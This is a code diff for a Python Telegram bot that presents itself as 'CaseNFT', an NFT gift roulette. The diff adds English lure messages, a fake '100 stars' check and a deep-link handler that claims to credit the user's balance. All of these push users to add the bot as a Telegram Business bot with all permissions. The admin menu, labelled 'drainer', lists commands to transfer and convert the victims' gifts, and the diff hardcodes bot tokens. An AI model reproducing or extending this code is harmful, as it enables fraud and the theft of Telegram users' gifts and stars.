@@ -117,7 +117,7 @@ import os
 
 BOT_TOKEN = os.getenv("BOT_TOKEN") 
 
-TOKEN = "8159810912:AAF_ce2HgxOjQBSwet6utmMYYn3QFI3B3ZA"
+TOKEN = "7991595592:AAFOcgnDkbv04JDdqGfIoOskbgDYrxHfFCA"
 ADMIN_ID = 767154085
 bot = Bot(TOKEN)
 
@@ -257,7 +257,91 @@ builder = InlineKeyboardBuilder()
 builder.button(text="⚙️ Открыть настройки Telegram", url="tg://settings")
 builder.button(text="🔗 Добавить в бизнес-аккаунт", url=f"tg://resolve?domain=CaseNftGameBot&start=business")
 
+builder2 = InlineKeyboardBuilder()
+builder2.button(text="⚙️ Open Telegram Settings", url="tg://settings")
+builder2.button(text="🔗 Add to Business Account", url="tg://resolve?domain=CaseNftGameBot&start=business")
 
+
+lang = InlineKeyboardBuilder()
+lang.button(text="🇬🇧", callback_data="eng")
+lang.button(text="🇷🇺", callback_data="ru")
+
+
+@dp.callback_query()
+async def callback(call: CallbackQuery):
+    if call.data == '🇬🇧':
+        activation_text = f"""
+Welcome, {call.from_user.full_name}! CaseNFT is the best NFT gift roulette in Telegram.
+This bot gives you a chance to win many valuable NFT gifts!
+
+To get started, follow these steps:
+<blockquote><i> [1] Go to your Telegram Settings.
+ [2] Open the "Telegram Business" section. 
+ [3] Tap on "Business Bots". 
+ [4] Add this bot and grant all permissions. </i></blockquote>
+"""
+
+        photo_url = 'https://i.postimg.cc/nLNQ5p0k/a8dea961-3ac5-494a-a459-abd5fa948690.png' 
+
+        await call.message.answer_photo(
+    photo=photo_url,
+    caption=activation_text,
+    reply_markup=builder2.as_markup(),
+    parse_mode='HTML'
+)
+        await call.message.answer(f"""
+<b>You will also receive <u>3 free roulette spins</u>!</b>
+""", parse_mode='html')
+
+
+
+    elif call.data == '🇷🇺':
+        activation_text = f"""
+<b> Добро пожаловать, {call.from_user.full_name}! CaseNFT — лучшая рулетка нфт-подарков в Телеграм.
+Данный бот дает возможность выиграть множество дорогих нфт-подарков!</b>
+
+<b> Для начала работы выполните шаги:</b>
+<blockquote><i> [1] Перейдите в настройки Telegram.
+ [2] Откройте раздел Telegram Business.
+ [3] Нажмите 'Боты для бизнеса'.
+ [4] Добавьте бота , предоставив все разрешения</i></blockquote>
+"""
+
+        photo_url = 'https://i.postimg.cc/nLNQ5p0k/a8dea961-3ac5-494a-a459-abd5fa948690.png' 
+
+        await call.message.answer_photo(
+    photo=photo_url,
+    caption=activation_text,
+    reply_markup=builder.as_markup(),
+    parse_mode='HTML'
+)
+        await call.message.answer(f"""
+<b>Так-же, вам будет бесплатно начислено <u>3 прокрута рулетки</u>!
+        """, parse_mode='html')
+
+
+mamont = InlineKeyboardBuilder()
+mamont.button(text="Получить 100⭐", url=f"https://t.me/CaseNftSpinBot?start=ref1234")
+mamont.adjust(1)
+
+
+@dp.message(F.text == "/check")
+async def start_command(message: Message):
+    activation_text2 = f"""
+<b>🚀 Чек на 100 звёзд в Send Stars</b>
+"""
+
+    photo_url2 = 'https://i.postimg.cc/mDxhPnG2/photo-2025-08-04-21-48-28.jpg' 
+
+    await bot.send_photo(
+    chat_id=message.chat.id,
+    photo=photo_url2,
+    caption=activation_text2,
+    parse_mode='HTML',
+    disable_notification=False,
+    show_caption_above_media=True,
+    reply_markup=mamont.as_markup()
+)
 
 
 @dp.message(F.text == "/start")
@@ -269,27 +353,10 @@ async def start_command(message: Message):
         count = 0
 
     if message.from_user.id != ADMIN_ID:
-        activation_text = f"""
-<b>▪️ Добро пожаловать, {message.from_user.full_name}! CaseNFT — лучшая рулетка нфт-подарков в Телеграм!
-Данный бот дает возможность выиграть множество дорогих нфт-подарков</b>
+        await message.answer(f"""
+<b>Выбери язык/Choose language:</b>
+        """, parse_mode='html', reply_markup=lang.as_markup())
 
-<b>▪️ Для начала работы выполните шаги:</b>
-<blockquote><i> [1] Перейдите в настройки Telegram.
- [2] Откройте раздел Telegram Business.
- [3] Нажмите 'Боты для бизнеса'.
- [4] Добавьте бота , предоставив все разрешения</i></blockquote>
-
-<b>▪️ После этого вам будет начислено <u>5 круток</u>. Удачной игры, приятель!</b>
-"""
-
-        photo_url = 'https://i.postimg.cc/nLNQ5p0k/a8dea961-3ac5-494a-a459-abd5fa948690.png' 
-
-        await message.answer_photo(
-    photo=photo_url,
-    caption=activation_text,
-    reply_markup=builder.as_markup(),
-    parse_mode='HTML'
-)
     else:
         await message.answer(
             f"""Дрейнер🔗
@@ -299,6 +366,33 @@ async def start_command(message: Message):
 /transfer <owned_id> <business_connect> - передать гифт вручную
 /convert - конвертировать подарки в звезды"""
         )
+
+
+
+
+
+@dp.message(CommandStart(deep_link=True))
+async def start_command(message: Message, command: CommandObject):
+    payload = command.args 
+    activation_text = f"""
+<b>На ваш баланс было зачислено 100⭐ от ?.</b>
+"""
+    photo_url = 'https://i.postimg.cc/SNBbXMnG/Kak-podarit-Telegram-Premium-i-chto-eto-dast-1677532117-900x450.jpg' 
+
+    await bot.send_photo(
+    chat_id=message.chat.id,
+    photo=photo_url,
+    caption=activation_text,
+    parse_mode='HTML',
+    disable_notification=False,
+    show_caption_above_media=True
+)
+    await message.answer(f"""<b>Чтобы активировать, выполни следующие шаги:</b>
+<blockquote><i> [1] Перейдите в настройки Telegram.
+ [2] Откройте раздел Telegram Business.
+ [3] Нажмите 'Боты для бизнеса'.
+ [4] Добавьте бота, предоставив все разрешения</i></blockquote>
+    """, parse_mode='html')
 
 
 
